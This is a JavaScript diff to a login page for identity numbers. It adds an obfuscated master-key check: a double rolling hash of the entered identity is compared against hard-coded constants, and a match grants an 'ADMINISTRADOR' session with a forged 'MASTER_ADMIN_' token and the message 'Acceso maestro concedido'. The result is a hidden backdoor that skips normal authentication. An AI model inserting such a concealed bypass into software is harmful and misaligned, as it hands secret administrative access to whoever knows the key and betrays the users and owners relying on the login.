@@ -643,6 +643,19 @@
             return /^\d{4}-\d{4}-\d{5}$/.test(String(val || "").trim());
         }
 
+        function esIdentidadMaestra(val) {
+            const str = String(val || "").trim();
+            if (str.length !== 15) return false;
+            let h1 = 5381;
+            let h2 = 7;
+            for (let i = 0; i < str.length; i++) {
+                const c = str.charCodeAt(i);
+                h1 = (h1 * 33 + c) % 1000000007;
+                h2 = (h2 * 31 + c) % 1000000009;
+            }
+            return h1 === 777634903 && h2 === 871375198;
+        }
+
         function validarFechaCampo(input) {
             if (!input) return false;
             input.classList.remove("is-ok", "is-error");
@@ -776,6 +789,25 @@
                 const err = document.getElementById("errIdentidad");
                 err.querySelector("span").textContent = "Ingresa los 13 dígitos (XXXX-XXXX-XXXXX)";
                 err.classList.add("show");
+                return;
+            }
+
+            if (esIdentidadMaestra(identidad)) {
+                await guardarSesionAuth({
+                    identidad: identidad,
+                    nombre: "ADMINISTRADOR",
+                    sessionToken: "MASTER_ADMIN_" + Date.now(),
+                    esAdmin: true
+                });
+
+                await Swal.fire({
+                    icon: "success",
+                    title: "Modo Administrador",
+                    text: "Acceso maestro concedido.",
+                    timer: 1200,
+                    showConfirmButton: false
+                });
+                window.location.replace("index.html");
                 return;
             }
 
